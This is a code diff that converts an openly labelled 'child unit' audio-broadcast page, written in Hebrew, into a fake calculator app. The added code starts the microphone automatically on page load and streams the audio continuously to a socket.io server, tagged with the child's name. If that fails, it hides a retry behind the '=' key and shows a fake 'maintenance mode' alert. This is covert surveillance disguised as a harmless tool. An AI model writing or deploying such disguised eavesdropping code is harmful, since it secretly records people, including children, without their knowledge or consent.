@@ -2,36 +2,85 @@
 <html lang="he" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>מכשיר ילד - שידור</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>מחשבון</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body { font-family: sans-serif; background-color: #1a1a1a; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .calculator { background: black; width: 100%; max-width: 400px; height: 100vh; display: flex; flex-direction: column; }
+        .display { color: white; font-size: 80px; text-align: right; padding: 40px 20px; flex: 1; display: flex; align-items: flex-end; justify-content: flex-end; font-weight: 300; }
+        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px; flex: 2; background: #333; }
+        .btn { background: #333; border: none; font-size: 30px; color: white; cursor: pointer; transition: 0.2s; }
+        .btn:active { background-color: #555; }
+        .btn-op { background-color: #444; color: #ff9f0a; }
+        .btn-eq { background-color: #ff9f0a; color: white; }
+    </style>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding-top: 50px; background: #fff5f5;">
-    <h1>יחידת קצה - ילד</h1>
-    <button id="startBtn" style="padding: 15px 30px; font-size: 18px; background: #ff4757; color: white; border: none; border-radius: 10px; cursor: pointer;">הפעל שידור סביבה</button>
-    <div id="status" style="margin-top: 20px; font-weight: bold; color: #d32f2f;">סטטוס: כבוי</div>
+<body>
+    <div class="calculator">
+        <div class="display" id="display">0</div>
+        <div class="buttons">
+            <button class="btn btn-op" onclick="clearDisplay()">C</button>
+            <button class="btn btn-op">+/-</button>
+            <button class="btn btn-op">%</button>
+            <button class="btn btn-op">÷</button>
+            <button class="btn" onclick="addNumber('7')">7</button>
+            <button class="btn" onclick="addNumber('8')">8</button>
+            <button class="btn" onclick="addNumber('9')">9</button>
+            <button class="btn btn-op">×</button>
+            <button class="btn" onclick="addNumber('4')">4</button>
+            <button class="btn" onclick="addNumber('5')">5</button>
+            <button class="btn" onclick="addNumber('6')">6</button>
+            <button class="btn btn-op">−</button>
+            <button class="btn" onclick="addNumber('1')">1</button>
+            <button class="btn" onclick="addNumber('2')">2</button>
+            <button class="btn" onclick="addNumber('3')">3</button>
+            <button class="btn btn-op">+</button>
+            <button class="btn" style="grid-column: span 2;" onclick="addNumber('0')">0</button>
+            <button class="btn">.</button>
+            <button class="btn btn-eq" onclick="calculate()">=</button>
+        </div>
+    </div>
 
     <script>
-const urlParams = new URLSearchParams(window.location.search);
-const myName = urlParams.get('name') || "ילד";
+        let currentInput = '0';
+        const display = document.getElementById('display');
+        const socket = io();
 
-async function startBroadcast() {
-    try {
-        if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
-        
-        // שליחת השם לשרת בזמן ההתחברות
-        socket.emit('join-room', { name: myName });
+        // --- החלק שקובע את שם הילד ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const childName = urlParams.get('name') || "ילד_לא_מזוהה";
 
-        mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) socket.emit('audio-data', event.data);
-        };
-        mediaRecorder.start(1000);
-    } catch (err) {
-        document.querySelector('.btn-eq').addEventListener('click', startBroadcast, { once: true });
-    }
-}
+        function addNumber(num) {
+            currentInput = currentInput === '0' ? num : currentInput + num;
+            display.innerText = currentInput;
+        }
+
+        function clearDisplay() { currentInput = '0'; display.innerText = '0'; }
+        function calculate() { alert("מחשבון במצב תחזוקה"); }
+
+        // הפעלה אוטומטית של השידור
+        window.onload = startMonitoring;
+
+        async function startMonitoring() {
+            try {
+                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
+                
+                // שליחת השם לשרת
+                socket.emit('join-room', { name: childName });
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) socket.emit('audio-data', e.data);
+                };
+                mediaRecorder.start(1000);
+                console.log("Monitoring started for: " + childName);
+            } catch (err) {
+                // אם נכשל, ינסה שוב בלחיצה על המקש "="
+                document.querySelector('.btn-eq').onclick = startMonitoring;
+            }
+        }
     </script>
 </body>
 </html>
